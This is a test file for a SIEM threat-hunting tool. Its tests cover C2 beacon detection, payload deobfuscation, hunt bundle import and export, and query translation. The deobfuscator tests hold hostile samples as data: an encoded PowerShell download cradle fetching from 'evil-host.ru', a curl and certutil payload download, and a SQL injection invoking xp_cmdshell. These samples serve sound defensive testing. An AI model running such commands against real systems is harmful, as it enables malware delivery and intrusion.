import { describe, expect, it } from "vitest";
import { computeBeaconJitter } from "@/lib/siem/beacon-jitter";
import { detectAndDeobfuscate } from "@/lib/siem/payload-deobfuscator";
import { exportHuntsBundle, importHuntsBundle, type SavedHunt, type SiemEvent } from "@/data/siem";
import { toSentinelKQL, translateAll } from "@/lib/siem/query-translator";

describe("beacon-jitter engine", () => {
  it("handles empty or insufficient events (< 4 events) by returning empty analysis", () => {
    const emptyResult = computeBeaconJitter([]);
    expect(Object.keys(emptyResult)).toHaveLength(0);

    const singleEvent: SiemEvent = {
      ts: "10:00:00",
      min: 0,
      src: "192.168.1.10",
      dst: "185.220.101.161",
      user: "admin",
      sig: "Outbound HTTPS",
      sev: "high",
    };
    const sparseResult = computeBeaconJitter([singleEvent]);
    expect(Object.keys(sparseResult)).toHaveLength(0);
  });

  it("accurately flags deterministic periodic C2 beaconing with jitter <= 25%", () => {
    // 5 events spaced evenly at 30 seconds apart (10:00:00, 10:00:30, 10:01:00, 10:01:30, 10:02:00)
    const events: SiemEvent[] = [
      { ts: "10:00:00", min: 0, src: "192.168.1.50", dst: "185.220.101.161", user: "system", sig: "Outbound SSL", sev: "high" },
      { ts: "10:00:30", min: 0, src: "192.168.1.50", dst: "185.220.101.161", user: "system", sig: "Outbound SSL", sev: "high" },
      { ts: "10:01:00", min: 1, src: "192.168.1.50", dst: "185.220.101.161", user: "system", sig: "Outbound SSL", sev: "high" },
      { ts: "10:01:30", min: 1, src: "192.168.1.50", dst: "185.220.101.161", user: "system", sig: "Outbound SSL", sev: "high" },
      { ts: "10:02:00", min: 2, src: "192.168.1.50", dst: "185.220.101.161", user: "system", sig: "Outbound SSL", sev: "high" },
    ];

    const result = computeBeaconJitter(events);
    const beacon = result["185.220.101.161"];

    expect(beacon).toBeDefined();
    expect(beacon.destination).toBe("185.220.101.161");
    expect(beacon.count).toBe(5);
    expect(beacon.meanIntervalSec).toBeCloseTo(30, 0);
    expect(beacon.stdDevSec).toBeCloseTo(0, 0);
    expect(beacon.jitterPct).toBeLessThanOrEqual(5);
    expect(beacon.isBeacon).toBe(true);
    expect(beacon.confidence).toBe("high");
  });

  it("does not flag sporadic random network traffic as C2 beaconing", () => {
    // 5 events spaced with high variance intervals
    const events: SiemEvent[] = [
      { ts: "10:00:00", min: 0, src: "192.168.1.50", dst: "45.33.32.156", user: "user01", sig: "DNS Query", sev: "info" },
      { ts: "10:00:10", min: 0, src: "192.168.1.50", dst: "45.33.32.156", user: "user01", sig: "DNS Query", sev: "info" },
      { ts: "10:01:40", min: 1, src: "192.168.1.50", dst: "45.33.32.156", user: "user01", sig: "DNS Query", sev: "info" },
      { ts: "10:01:50", min: 1, src: "192.168.1.50", dst: "45.33.32.156", user: "user01", sig: "DNS Query", sev: "info" },
      { ts: "10:04:30", min: 4, src: "192.168.1.50", dst: "45.33.32.156", user: "user01", sig: "DNS Query", sev: "info" },
    ];

    const result = computeBeaconJitter(events);
    const traffic = result["45.33.32.156"];

    expect(traffic).toBeDefined();
    expect(traffic.jitterPct).toBeGreaterThan(40);
    expect(traffic.isBeacon).toBe(false);
  });
});

describe("payload-deobfuscator engine", () => {
  it("detects and decodes UTF-16LE Base64 PowerShell encoded commands", () => {
    // UTF-16LE Base64 for: IEX (New-Object Net.WebClient).DownloadString('https://evil-host.ru/payload.ps1')
    const rawCommand =
      "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC0AaABvAHMAdAAuAHIAdQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkACgA=";

    const result = detectAndDeobfuscate(rawCommand);
    expect(result).not.toBeNull();
    expect(result?.encoding).toBe("utf-16le");
    expect(result?.decodedText).toContain("New-Object Net.WebClient");
    expect(result?.decodedText).toContain("DownloadString");
    expect(result?.extractedObservables.urls).toContain("https://evil-host.ru/payload.ps1");
  });

  it("detects and decodes UTF-8 Base64 strings with IP addresses and lolbins", () => {
    // Base64 for: curl -O http://185.220.101.161/drop.exe && certutil -urlcache drop.exe
    const b64 = Buffer.from("curl -O http://185.220.101.161/drop.exe && certutil -urlcache drop.exe", "utf-8").toString("base64");
    const sample = `powershell -Command "${b64}"`;

    const result = detectAndDeobfuscate(sample);
    expect(result).not.toBeNull();
    expect(result?.encoding).toBe("utf-8");
    expect(result?.decodedText).toContain("http://185.220.101.161/drop.exe");
    expect(result?.extractedObservables.ips).toContain("185.220.101.161");
    expect(result?.extractedObservables.commands).toContain("certutil");
  });

  it("detects and decodes URL-encoded payloads", () => {
    const rawUrl = "GET /login?user=admin%27%20OR%201%3D1%3B%20exec%20xp_cmdshell%28%27powershell%20-enc%27%29--";
    const result = detectAndDeobfuscate(rawUrl);
    expect(result).not.toBeNull();
    expect(result?.encoding).toBe("url");
    expect(result?.decodedText).toContain("admin' OR 1=1; exec xp_cmdshell('powershell -enc')--");
  });

  it("returns null for benign clean strings", () => {
    const benign = "LogName: Security EventID: 4624 AccountName: user01 LogonType: 2";
    expect(detectAndDeobfuscate(benign)).toBeNull();
  });
});

describe("siem hunt bundle export and import", () => {
  const sampleHunts: SavedHunt[] = [
    {
      id: "hunt-test-1",
      name: "Kerberoasting TGS Hunt",
      text: "EventID: 4769 TicketOptions: 0x40810000 TicketEncryptionType: 0x17",
      q: "TicketEncryptionType:0x17",
      chips: [{ field: "sev", value: "high" }],
      range: "1h",
      pinned: true,
      updatedAt: 1700000000000,
    },
  ];

  it("exports a hunt bundle with metadata and schema version", () => {
    const jsonString = exportHuntsBundle(sampleHunts);
    const parsed = JSON.parse(jsonString);

    expect(parsed.schema_version).toBe("1.0");
    expect(parsed.generator).toBe("BeyondLabs SIEM Workstation");
    expect(parsed.hunts).toHaveLength(1);
    expect(parsed.hunts[0].name).toBe("Kerberoasting TGS Hunt");
  });

  it("imports a valid hunt bundle JSON string", () => {
    const jsonString = exportHuntsBundle(sampleHunts);
    const imported = importHuntsBundle(jsonString);

    expect(imported).toHaveLength(1);
    expect(imported[0].id).toBe("hunt-test-1");
    expect(imported[0].name).toBe("Kerberoasting TGS Hunt");
  });

  it("safely handles invalid or corrupted JSON without crashing", () => {
    expect(importHuntsBundle("invalid json string")).toEqual([]);
    expect(importHuntsBundle(JSON.stringify({ not: "a bundle" }))).toEqual([]);
  });
});

describe("query-translator with Microsoft Sentinel KQL", () => {
  it("translates query and chips into Microsoft Sentinel KQL", () => {
    const kql = toSentinelKQL("powershell", [{ field: "src", value: "185.220.101.161" }]);
    expect(kql).toContain("SecurityEvent");
    expect(kql).toContain('IpAddress =~ "185.220.101.161"');
    expect(kql).toContain('* has "powershell"');
    expect(kql).toContain("summarize count() by TargetUserName, EventID, IpAddress");
  });

  it("provides sentinelKql in translateAll alongside Splunk, Elastic, Sigma, and Velociraptor", () => {
    const all = translateAll("mimikatz", [{ field: "user", value: "Administrator" }]);
    expect(all.splunkSpl).toContain("index=*");
    expect(all.elasticKql).toContain("user.name");
    expect(all.sentinelKql).toContain("SecurityEvent");
    expect(all.sigmaYaml).toContain("title:");
    expect(all.velociraptorVql).toContain("Artifact.Windows.EventLogs.EvtxHunter");
  });
});
